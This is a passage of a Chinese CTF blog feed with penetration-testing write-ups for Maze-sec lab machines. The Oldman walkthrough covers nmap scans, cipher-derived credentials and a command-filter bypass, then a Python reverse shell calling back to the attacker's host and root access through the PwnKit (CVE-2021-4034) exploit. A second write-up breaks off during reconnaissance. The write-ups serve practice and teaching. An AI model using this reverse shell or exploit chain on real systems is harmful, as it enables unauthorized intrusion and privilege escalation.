class="code"><pre><code class="hljs bash">root@walker:/home/walk# <span class="hljs-built_in">cat</span> /home/walk/user.txt /root/root.txt <br>flag&#123;walk-user-bububububu&#125;<br>flag&#123;walk-root-hahahahahaha&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>python-os劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oldman</title>
    <link href="/Maze-sec/Oldman/"/>
    <url>/Maze-sec/Oldman/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-24 14:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00035s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00044s latency).<br>MAC Address: 08:00:27:8B:9E:BA (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.16<br>Host is up (0.00058s latency).<br>MAC Address: 08:00:27:C5:75:79 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.14 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.16</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.16                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-24 14:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.16<br>Host is up (0.00080s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 08:00:27:C5:75:79 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.74 seconds<br></code></pre></td></tr></table></figure><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p80 192.168.2.16 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-24 14:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.16<br>Host is up (0.00080s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>|_http-title: HYH<br>|_http-server-header: Apache/2.2.22 (Ubuntu)<br>MAC Address: 08:00:27:C5:75:79 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.01 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap -sU --top-ports 100 192.168.2.16                 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-24 14:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.16<br>Host is up (0.0011s latency).<br>Not shown: 55 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)<br>PORT     STATE SERVICE<br>5353/udp open  zeroconf<br>MAC Address: 08:00:27:C5:75:79 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 50.81 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><p>访问80端口，发现一个图片，有可能是一种加密方式<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509241635981.png"></p><h2 id="1、足迹字母表"><a href="#1、足迹字母表" class="headerlink" title="1、足迹字母表"></a>1、足迹字母表</h2><p>经过查询，发现上面的加密方式是足迹字母表<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509241636240.png"><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509241637081.png"></p><p>经过对比，解密出结果为：<code>HYHFOREVER</code></p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.16&quot;</span>       <br>...<br>[15:04:53] 200 -    1KB - /login.php<br>[15:04:53] 200 -    1KB - /login<br>[15:04:54] 200 -    1KB - /login/<br>[15:04:54] 200 -    1KB - /login/admin/admin.asp<br>[15:04:54] 200 -    1KB - /login/admin/<br>[15:04:54] 200 -    1KB - /login/cpanel.php<br>[15:04:54] 200 -    1KB - /login/administrator/<br>[15:04:54] 200 -    1KB - /login/cpanel.jsp<br>[15:04:54] 200 -    1KB - /login/cpanel.aspx<br>[15:04:54] 200 -    1KB - /login/cpanel.html<br>[15:04:54] 200 -    1KB - /login/cpanel.js<br>[15:04:54] 200 -    1KB - /login/login<br>[15:04:54] 200 -    1KB - /login/index<br>[15:04:54] 200 -    1KB - /login/cpanel/<br>[15:04:54] 200 -    1KB - /login/oauth/<br>[15:04:54] 200 -    1KB - /login/super<br>[15:04:54] 302 -   20B  - /logout  -&gt;  login.php<br>[15:04:54] 302 -   20B  - /logout.php  -&gt;  login.php<br>[15:04:54] 302 -   20B  - /logout/  -&gt;  login.php<br>[15:05:15] 403 -  238B  - /server-status<br>[15:05:15] 403 -  238B  - /server-status/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>访问<code>/login</code>，找到登录界面，根据上面获取到的凭证：<code>hyh:hyhforever</code>进行登录，成功进入到终端管理页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509241641052.png"></p><h2 id="3、限制命令绕过"><a href="#3、限制命令绕过" class="headerlink" title="3、限制命令绕过"></a>3、限制命令绕过</h2><p>提示只允许执行<code>ls, pwd, whoami, id, date, uname, echo, cat</code>这几个命令，经过尝试，发现可以使用<code>|</code>进行绕过，执行后面的命令<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509241643283.png"></p><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>使用Python反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nc -lvnp 4444     <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.16] 56633<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取hyh权限"><a href="#1、获取hyh权限" class="headerlink" title="1、获取hyh权限"></a>1、获取hyh权限</h2><p>根据上面获取到的凭证<code>hyhforever</code>，成功切换到<code>hyh用户</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Oldman:/tmp$ su hyh<br>Password: <br>hyh@Oldman:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(hyh) gid=1000(hyh) <span class="hljs-built_in">groups</span>=1000(hyh)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>使用<code>linpeas</code>查看，发现存在内核提权漏洞<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509250953034.png"></p><p>查看系统内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hyh@Oldman:/tmp$ <span class="hljs-built_in">uname</span> -r<br>3.11.0-15-generic<br></code></pre></td></tr></table></figure><p>利用脚本<br><a href="https://codeload.github.com/berdav/CVE-2021-4034/zip/main">https://codeload.github.com/berdav/CVE-2021-4034/zip/main</a></p><p><code>make</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hyh@Oldman:/tmp$ make<br>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules<br><span class="hljs-built_in">mkdir</span> -p GCONV_PATH=.<br><span class="hljs-built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.<br></code></pre></td></tr></table></figure><p>获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hyh@Oldman:/tmp$ ./cve-2021-4034          <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(hyh)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /home/hyh/Desktop/user.txt /root/root.txt</span><br>flag&#123;user-11a951681e76cf2cb51896e29916cf4d&#125;<br>flag&#123;root-e5ef24d17e710f36179588a66b667197&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>提权-Pwnkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Next</title>
    <link href="/Maze-sec/Next/"/>
    <url>/Maze-sec/Next/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li><li>WP编写参考：<a href="https://7r1umphk.github.io/post/nei-bu-_Next.html">https://7r1umphk.github.io/post/nei-bu-_Next.html</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 23:05 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00071s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00036s latency).<br>MAC Address: 08:00:27:F8:17:C0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00053s latency).<br>MAC Address: 08:00:27:D7:C6:38 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.05 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.70</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.13                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 23:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00017s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:D7:C6:38 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.00 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、3000</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,3000 192.168.2.13<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 23:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00049s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">3000/tcp open  ppp?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     X-Powered-By: Next.js</span><br><span class="hljs-string">|     ETag: &quot;wvpz46leg16iz&quot;</span><br><span class="hljs-string">|     Content-Type: text/html; charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 8460</span><br><span class="hljs-string">|     Vary: Accept-Encoding</span><br><span class="hljs-string">|     Date: Sun, 14 Sep 2025 15:16:23 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charSet=&quot;utf-8&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;/&gt;&lt;title class=&quot;jsx-1eb51da0ac6ad36f&quot;&gt;maze-sec | Cybersecurity Research&lt;/title&gt;&lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; class=&quot;jsx-1eb51da0ac6ad36f&quot;/&gt;&lt;meta name=&quot;hint&quot; content=&quot;Authorized access at a secret endpoint. Try 2025.&quot; class=&quot;jsx-1eb51da0ac6ad36f&quot;/&gt;&lt;meta name=&quot;next-head-count&quot; content=&quot;5&quot;/&gt;&lt;noscript data-n-css=&quot;&quot;&gt;&lt;/noscript&gt;&lt;script defer=&quot;&quot; nomodule=&quot;&quot; src=&quot;/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/webpack-9b312e20a4e32339.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/framework-6805d7a71c2d770b.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;&lt;scr</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 405 Method Not Allowed</span><br><span class="hljs-string">|     Allow: GET</span><br><span class="hljs-string">|     Allow: HEAD</span><br><span class="hljs-string">|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate</span><br><span class="hljs-string">|     X-Powered-By: Next.js</span><br><span class="hljs-string">|     Content-Type: text/html; charset=utf-8</span><br><span class="hljs-string">|     Vary: Accept-Encoding</span><br><span class="hljs-string">|     Date: Sun, 14 Sep 2025 15:16:23 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charSet=&quot;utf-8&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;/&gt;&lt;title&gt;405: Method Not Allowed&lt;/title&gt;&lt;meta name=&quot;next-head-count&quot; content=&quot;3&quot;/&gt;&lt;noscript data-n-css=&quot;&quot;&gt;&lt;/noscript&gt;&lt;script defer=&quot;&quot; nomodule=&quot;&quot; src=&quot;/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/webpack-9b312e20a4e32339.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/framework-6805d7a71c2d770b.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/main-c396fbccb3dec4e9.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/_next/static/chunks/pages/_app-dc14f8483464b560.js&quot; defer=&quot;&quot;&gt;&lt;/scri</span><br><span class="hljs-string">|   Help, NCP: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">...</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds</span><br></code></pre></td></tr></table></figure><ol><li>22端口，ssh服务</li><li>80端口，http服务</li><li>3000端口，ppp服务，可能是node.js应用</li></ol><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sU --top-ports 100 192.168.2.13                          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 23:17 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00034s latency).<br>All 100 scanned ports on 192.168.2.13 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 60 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:D7:C6:38 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 57.53 seconds<br></code></pre></td></tr></table></figure><p>没有开放的udp端口</p><h3 id="4-脚本漏洞扫描"><a href="#4-脚本漏洞扫描" class="headerlink" title="4.脚本漏洞扫描"></a>4.脚本漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --script=vuln -p22,80,3000 192.168.2.13              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 23:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00032s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">3000/tcp open  ppp</span><br><span class="hljs-string">MAC Address: 08:00:27:D7:C6:38 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds</span><br></code></pre></td></tr></table></figure><p>没有新的信息</p><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# curl http://192.168.2.13                                                                    <br>No matter <span class="hljs-built_in">where</span> life takes you, keep going NEXT.<br></code></pre></td></tr></table></figure><p>只访问了一句话，提示可能与<code>next.js</code>有关</p><h2 id="2、3000端口"><a href="#2、3000端口" class="headerlink" 